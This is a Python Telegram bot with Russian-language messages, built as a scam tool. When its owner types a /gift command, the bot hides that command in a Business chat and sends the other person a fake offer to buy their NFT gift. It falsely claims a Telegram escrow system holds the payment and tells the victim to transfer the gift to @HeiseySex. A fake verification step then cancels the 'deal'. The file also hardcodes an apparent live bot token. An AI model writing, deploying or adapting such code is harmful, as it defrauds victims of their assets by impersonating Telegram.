import os
import re
import time
import threading
import requests
import telebot
from flask import Flask
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ─────────────────────── НАСТРОЙКИ ───────────────────────

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8623132805:AAHjoDJYRGBLuU9BjWtjbL6q5cVvwOtObQA")

OWNER_ID = 861423393

TARGET_URL = "https://t.me/HeiseySex"

VERIFY_TIMEOUT_SECONDS = 300  # 5 минут

# ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────

bot = telebot.TeleBot(BOT_TOKEN)

offers = {}
offers_lock = threading.Lock()


# ─────────────────────── УТИЛИТЫ ───────────────────────

def normalize_url(raw):
    raw = raw.strip().strip('"').strip("'")
    if raw.startswith("@"):
        return f"https://t.me/{raw[1:]}"
    if raw.startswith(("http://", "https://")):
        return raw
    return f"https://t.me/{raw.lstrip('/')}"


def parse_gift_command(text):
    """Гибкий парсер: /gift "Название" "ссылка" 100 или /gift "Название" "ссылка" "100"."""
    # Убираем возможный суффикс @username после /gift
    text = re.sub(r'^/gift(@\w+)?', '/gift', text)
    body = text.replace("/gift", "", 1).strip()
    if not body:
        return None

    quoted = re.findall(r'"([^"]*)"', body)
    without_quotes = re.sub(r'"[^"]*"', " ", body).strip()

    name = None
    url = None
    amount_part = None

    if len(quoted) >= 3:
        name = quoted[0]
        url = normalize_url(quoted[1])
        amount_part = quoted[2]
    elif len(quoted) == 2:
        name = quoted[0]
        url = normalize_url(quoted[1])
        tokens = without_quotes.split()
        if tokens:
            amount_part = tokens[0]
    elif len(quoted) == 1:
        name = quoted[0]
        tokens = without_quotes.split()
        if len(tokens) >= 2:
            url = normalize_url(tokens[0])
            amount_part = tokens[1]
    else:
        tokens = body.split()
        if len(tokens) < 3:
            return None
        name = tokens[0]
        url = normalize_url(tokens[1])
        amount_part = tokens[2]

    amount = re.sub(r"\D", "", amount_part) if amount_part else ""

    if not name or not url or not amount:
        print(f"[PARSE] Не удалось: name={name!r}, url={url!r}, amount={amount!r}")
        return None

    return name, url, amount


def build_offer_message(name, url, amount):
    return (
        "Вам поступило предложение о покупке подарка.\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Пользователь предлагает вам <b>{amount}</b> ⭐ за подарок "
        f"<a href=\"{url}\">{name}</a>.\n\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )


def build_offer_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
        InlineKeyboardButton("❌ Отклонить", callback_data="stage_decline"),
    )
    return keyboard


def build_escrow_message(name, url, amount):
    return (
        f"Пользователь зарезервировал <b>{amount}</b> ⭐ через "
        "эксроу-систему Telegram. Средства хранятся на специальном "
        "эксроу-счёте и будут автоматически зачислены на ваш баланс "
        "звёзд сразу после передачи подарка.\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<b>Инструкция для завершения сделки:</b>\n\n"
        f"1. Передайте подарок пользователю: @HeiseySex\n"
        f"2. Нажмите «Передать NFT» и выберите "
        f"<a href=\"{url}\">{name}</a>\n"
        "3. Подтвердите передачу подарка.\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"<b>{amount}</b> ⭐ на ваш баланс."
    )


def build_escrow_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton("🔗 Передать подарок", url=TARGET_URL))
    keyboard.row(
        InlineKeyboardButton("⚡ Подтвердить", callback_data="stage_verify"),
        InlineKeyboardButton("❌ Отменить", callback_data="stage_decline"),
    )
    return keyboard


def try_delete_message(chat_id, message_id, conn_id=None):
    try:
        if conn_id:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
            payload = {
                "chat_id": chat_id,
                "message_id": message_id,
                "business_connection_id": conn_id,
            }
            r = requests.post(url, json=payload, timeout=10)
            if r.status_code == 200:
                print(f"[DELETE] {message_id} удалено (business)")
                return
            try:
                desc = r.json().get("description", "")
            except Exception:
                desc = r.text
            if "message to delete not found" in desc:
                print(f"[DELETE] {message_id} уже отсутствует (ок)")
                return
            print(f"[DELETE] Ошибка: {r.status_code} {desc}")
        else:
            bot.delete_message(chat_id, message_id)
            print(f"[DELETE] {message_id} удалено")
    except Exception as e:
        print(f"[DELETE] Сетевая ошибка: {e}")


def safe_edit(chat_id, message_id, text, parse_mode="HTML",
              reply_markup=None, conn_id=None):
    kwargs = {
        "chat_id": chat_id,
        "message_id": message_id,
        "parse_mode": parse_mode,
    }
    if reply_markup is not None:
        kwargs["reply_markup"] = reply_markup
    if conn_id:
        kwargs["business_connection_id"] = conn_id
    try:
        bot.edit_message_text(text, **kwargs)
        return True
    except Exception as e:
        print(f"[EDIT] {message_id}: {e}")
        return False


def send_business_message(chat_id, text, conn_id, reply_markup=None):
    kwargs = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "business_connection_id": conn_id,
    }
    if reply_markup is not None:
        kwargs["reply_markup"] = reply_markup

    try:
        sent = bot.send_message(**kwargs)
        print(f"[SEND] OK → чат {chat_id}, msg_id={sent.message_id}")
        return sent
    except Exception as e:
        err = str(e)
        print(f"[SEND] ОШИБКА для чата {chat_id}: {err}")

        if "PRIVACY_PREMIUM_REQUIRED" in err:
            print("  → У собеседника включён Premium-фильтр для незнакомцев.")
        elif "CHAT_WRITE_FORBIDDEN" in err:
            print("  → Собеседник запретил приём сообщений от ботов.")
        elif "USER_IS_BLOCKED" in err:
            print("  → Ты заблокирован.")
        elif "PEER_FLOOD" in err:
            print("  → Спам-блок Telegram.")
        elif "PEER_ID_INVALID" in err:
            print("  → Чат не поддерживает Business-сообщения.")
        elif "BUSINESS_CONNECTION" in err:
            print("  → Telegram отклонил Business-соединение для этого чата.")
        elif "CHAT_ADMIN_REQUIRED" in err:
            print("  → Это группа/канал.")
        elif "FLOOD_WAIT" in err:
            print("  → Слишком часто. Подожди.")
        else:
            print(f"  → Неизвестная ошибка.")

        return None


# ─────────────────────── ТАЙМЕР ВЕРИФИКАЦИИ ───────────────────────

def schedule_verify_timeout(chat_id, message_id, conn_id):
    def job():
        time.sleep(VERIFY_TIMEOUT_SECONDS)
        safe_edit(
            chat_id,
            message_id,
            "⛔ <b>Сделка не завершена.</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Вы не выполнили все условия передачи подарка.\n\n"
            "Передача не была подтверждена в установленное время, "
            "поэтому резерв средств был снят, а предложение — "
            "автоматически аннулировано.\n\n"
            "Если вы всё ещё хотите завершить сделку, попросите "
            "пользователя отправить предложение повторно.\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            conn_id=conn_id,
        )
        print(f"[VERIFY-TIMEOUT] msg {message_id} обновлён")

    t = threading.Thread(target=job, daemon=True)
    t.start()


# ─────────────────────── BUSINESS CONNECTION (только для логов) ───────────────────────

@bot.business_connection_handler(func=lambda conn: True)
def on_business_connection(connection):
    print(f"[BUSINESS] Соединение: {connection.id}")
    print(f"[BUSINESS] Владелец: {connection.user.id}")
    rights = connection.rights
    print(f"[BUSINESS] Права: reply={getattr(rights, 'can_reply', '?')}, "
          f"delete={getattr(rights, 'can_delete_messages', '?')}")
    print(f"[BUSINESS] Активно: {connection.is_enabled}")


# ─────────────────────── УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК ───────────────────────

@bot.message_handler(func=lambda m: m.text is not None, content_types=["text"])
def handle_all_messages(message):
    """Ловит ВСЕ текстовые сообщения, включая бизнес-чаты."""
    conn_id = getattr(message, "business_connection_id", None)
    sender_id = message.from_user.id
    text = message.text

    print(f"[MSG] От {sender_id} в чате {message.chat.id}: {text!r} | conn_id={conn_id}")

    # Реагируем только на владельца
    if sender_id != OWNER_ID:
        return

    # Только /gift
    if not text.startswith("/gift"):
        return

    parsed = parse_gift_command(text)
    if not parsed:
        if conn_id:
            send_business_message(
                message.chat.id,
                "❌ Неверный формат команды.\n\n"
                "Используй: /gift \"Название\" \"ссылка\" 100",
                conn_id,
            )
        return

    name, url, amount = parsed
    print(f"[GIFT] name={name!r}, url={url}, amount={amount}")

    if conn_id:
        try_delete_message(message.chat.id, message.message_id, conn_id)

        sent = send_business_message(
            message.chat.id,
            build_offer_message(name, url, amount),
            conn_id,
            reply_markup=build_offer_keyboard(),
        )

        if sent is None:
            return

        with offers_lock:
            offers[sent.message_id] = {
                "name": name,
                "url": url,
                "amount": amount,
                "finished": False,
                "conn_id": conn_id,
                "chat_id": message.chat.id,
            }
    else:
        # Обычный (не Business) чат — просто отвечаем
        bot.send_message(
            message.chat.id,
            build_offer_message(name, url, amount),
            parse_mode="HTML",
            reply_markup=build_offer_keyboard(),
        )


# ─────────────────────── КНОПКИ ───────────────────────

@bot.callback_query_handler(func=lambda call: True)
def callback_router(call):
    payload = call.data
    print(f"[CALLBACK] {payload} от {call.from_user.id}")

    conn_id = getattr(call.message, "business_connection_id", None)

    with offers_lock:
        if call.message.message_id in offers:
            offers[call.message.message_id]["finished"] = True

    if payload == "stage_accept":
        bot.answer_callback_query(
            call.id,
            text=(
                "Ознакомьтесь с инструкцией на следующем экране.\n"
                "Следуйте шагам по порядку, чтобы завершить сделку."
            ),
            show_alert=True,
        )

        text = call.message.html_text or call.message.text or ""
        m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text)
        url = m.group(1) if m else TARGET_URL
        name = m.group(2) if m else "Подарок"

        m2 = re.search(r'<b>(\d+)</b>\s*⭐', text)
        amount = m2.group(1) if m2 else "0"

        safe_edit(
            call.message.chat.id,
            call.message.message_id,
            build_escrow_message(name, url, amount),
            reply_markup=build_escrow_keyboard(),
            conn_id=conn_id,
        )

    elif payload == "stage_verify":
        bot.answer_callback_query(call.id)
        safe_edit(
            call.message.chat.id,
            call.message.message_id,
            "⏳ <b>Проверка передачи…</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Система проверяет статус передачи подарка. "
            "Это может занять несколько минут.\n\n"
            "Пожалуйста, не закрывайте чат.\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            conn_id=conn_id,
        )
        schedule_verify_timeout(
            call.message.chat.id,
            call.message.message_id,
            conn_id,
        )

    elif payload == "stage_decline":
        bot.answer_callback_query(call.id, text="Предложение отклонено.")
        safe_edit(
            call.message.chat.id,
            call.message.message_id,
            "❌ <b>Предложение отклонено.</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Сессия закрыта. Если вы передумаете, "
            "пользователь может отправить предложение повторно.\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            conn_id=conn_id,
        )


# ─────────────────────── ЗАПУСК ───────────────────────

app = Flask(__name__)


@app.route("/")
def index():
    return "Bot is running"


@app.route("/health")
def health():
    return "OK"


def run_bot():
    print("✨ Бот запущен (в облаке).")
    print(f"OWNER_ID: {OWNER_ID}")
    bot.infinity_polling(
        allowed_updates=[
            "message",
            "callback_query",
            "business_connection",
            "business_message",
            "edited_business_message",
            "deleted_business_messages",
        ],
        timeout=30,
    )


if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
